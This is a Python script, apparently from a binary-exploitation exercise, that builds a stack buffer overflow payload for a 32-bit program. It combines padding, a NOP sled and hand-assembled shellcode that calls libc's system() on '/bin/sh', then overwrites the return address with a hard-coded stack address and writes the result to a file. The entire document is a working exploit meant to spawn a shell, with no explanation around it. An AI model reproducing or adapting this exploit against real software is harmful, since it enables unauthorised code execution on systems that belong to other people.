import struct

# Assume these values are found through your analysis
buffer_size = 20
buffer_followup_offset = 9
libc_base_addr = 0xb7e2c000
exit_offset = 0x32be0
system_offset = 0x0003f060
bin_sh_offset = 0x160c58
str_addr = 0xbfffff58
shellcode_address = 0xbfffe970

# Create the payload
payload = b"a" * 20
payload += b"\x0a"
payload += b"\x90" * (0x800 - 21)
payload += b"\xc7\x04\x24"  # mov_dword
payload += struct.pack("<I", libc_base_addr + bin_sh_offset)
payload += b"\xb8"          # push address on eax
payload += struct.pack("<I", libc_base_addr + system_offset) # current address for relative call
payload += b"\xff\xd0"      # call eax 
payload += b"\x00" * (0x800 - 14)
payload += b"a" * 14
#payload += b"0123"
#payload += b"a"
#payload += b"0123"
payload += struct.pack("<I", shellcode_address)
#payload += struct.pack("<I", shellcode_address)
#payload += struct.pack("<I", libc_base_addr + exit_offset)
payload += b"a"
payload += b"\x0a\x00"


# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)
